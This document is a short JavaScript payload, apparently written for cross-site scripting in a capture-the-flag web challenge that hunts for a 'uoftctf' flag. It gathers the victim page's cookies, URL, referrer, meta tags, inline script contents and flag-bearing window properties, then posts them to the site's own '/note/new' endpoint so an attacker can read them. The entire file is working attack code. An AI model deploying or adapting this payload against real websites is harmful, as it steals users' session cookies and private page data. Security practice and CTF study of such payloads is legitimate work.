// Capture EVERYTHING
var data = {
  url: location.href,
  hash: location.hash,
  search: location.search,
  referrer: document.referrer,
  cookie: document.cookie,
  title: document.title,
  domain: document.domain,
  origin: location.origin
};

// Check window properties for flag
var windowProps = '';
try {
  for (var key in window) {
    if (typeof window[key] === 'string' && window[key].indexOf('uoftctf') !== -1) {
      windowProps += key + '=' + window[key] + ';';
    }
  }
} catch(e) {}

// Check all script contents
var scripts = '';
try {
  var s = document.querySelectorAll('script');
  for (var i = 0; i < s.length; i++) {
    scripts += s[i].innerText.substring(0, 500) + '---';
  }
} catch(e) {}

// Check meta tags
var metas = '';
try {
  var m = document.querySelectorAll('meta');
  for (var i = 0; i < m.length; i++) {
    metas += m[i].outerHTML + ';';
  }
} catch(e) {}

var result = 'URL:' + data.url + 
  '\nHASH:' + (data.hash || 'NONE') + 
  '\nSEARCH:' + (data.search || 'NONE') + 
  '\nREFERRER:' + (data.referrer || 'NONE') + 
  '\nCOOKIE:' + (data.cookie || 'NONE') + 
  '\nWINDOW_FLAGS:' + (windowProps || 'NONE') + 
  '\nMETAS:' + metas.substring(0, 500) +
  '\nSCRIPTS:' + scripts.substring(0, 1000);

fetch('/note/new', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'title=DEBUG&body=' + encodeURIComponent(result)
});
